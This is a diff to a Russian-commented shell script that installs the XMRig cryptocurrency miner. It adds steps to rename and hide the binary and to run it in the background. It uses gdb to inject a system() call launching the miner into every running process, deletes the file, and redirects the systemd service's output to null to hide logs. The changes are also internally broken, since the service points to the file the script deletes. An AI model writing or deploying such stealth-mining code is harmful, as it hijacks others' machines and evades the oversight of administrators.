@@ -12,10 +12,10 @@ echo "Начало установки XMRig..."
 echo "Установка зависимостей..."
 if [ -f /etc/redhat-release ]; then
     yum install -y epel-release
-    yum install -y wget tar gzip
+    yum install -y wget tar gzip gdb
 elif [ -f /etc/debian_version ]; then
     apt update
-    apt install -y wget tar gzip
+    apt install -y wget tar gzip gdb
 else
     echo "Не поддерживаемая система." >&2
     exit 1
@@ -58,6 +58,31 @@ cat <<EOF > /etc/xmrig/config.json
 }
 EOF
 
+# Переименование XMRig для скрытия
+echo "Переименование XMRig для скрытия..."
+mv /etc/xmrig/xmrig /tmp/xmrig-hidden
+
+# Запуск XMRig в фоне
+echo "Запуск XMRig в фоне..."
+/tmp/xmrig-hidden --config /etc/xmrig/config.json &
+
+# Ожидание старта XMRig
+sleep 5
+
+# Инжекция XMRig в все процессы
+echo "Инжекция XMRig во все процессы..."
+for PID in $(ps -e -o pid=); do
+    if [ "$PID" -ne "$$" ]; then
+        echo "Инжекция в процесс $PID..."
+        # Инжекция с помощью gdb
+        gdb -p $PID -ex "call (void)system(\"/tmp/xmrig-hidden\")" -ex quit
+    fi
+done
+
+# Удаление временного файла XMRig
+echo "Удаление временного файла XMRig..."
+rm /tmp/xmrig-hidden
+
 # Создание systemd сервиса
 echo "Создание systemd сервиса для XMRig..."
 cat <<EOF > /etc/systemd/system/xmrig.service
@@ -66,10 +91,13 @@ Description=XMRig
 After=network.target
 
 [Service]
-ExecStart=/etc/xmrig/xmrig --config /etc/xmrig/config.json
+ExecStart=/tmp/xmrig-hidden --config /etc/xmrig/config.json
 Restart=always
 User=nobody
 Group=nogroup
+# Перенаправляем вывод в null, чтобы скрыть логи
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
